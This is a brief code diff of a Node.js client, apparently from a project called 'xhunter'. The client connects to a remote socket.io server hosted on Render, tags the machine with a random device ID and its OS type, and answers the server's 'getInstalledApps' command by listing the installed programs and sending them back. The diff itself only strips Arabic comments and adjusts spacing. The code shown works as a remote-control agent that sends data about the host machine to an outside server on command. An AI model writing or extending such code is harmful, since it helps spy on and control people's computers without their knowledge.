@@ -3,7 +3,7 @@ const os = require('os');
 const fs = require('fs');
 const path = require('path');
 
-const socket = io('https://xhunter-nd49.onrender.com'); // رابط السيرفر على Render
+const socket = io('https://xhunter-nd49.onrender.com');
 
 const deviceId = 'device_' + Math.floor(Math.random()*10000);
 const model = os.type() + ' ' + os.arch();
@@ -14,12 +14,11 @@ function sendResult(action, data){
   socket.emit(action, { id: deviceId, action, data });
 }
 
-// أوامر العميل
 socket.on('getInstalledApps', () => {
   let apps = [];
   try {
-    if (fs.existsSync('C:/Program Files')) apps = fs.readdirSync('C:/Program Files');
-    else if (fs.existsSync('/Applications')) apps = fs.readdirSync('/Applications');
+    if(fs.existsSync('C:/Program Files')) apps = fs.readdirSync('C:/Program Files');
+    else if(fs.existsSync('/Applications')) apps = fs.readdirSync('/Applications');
   } catch(e){ apps = ['خطأ في الوصول إلى التطبيقات']; }
   sendResult('getInstalledApps', apps);
 });
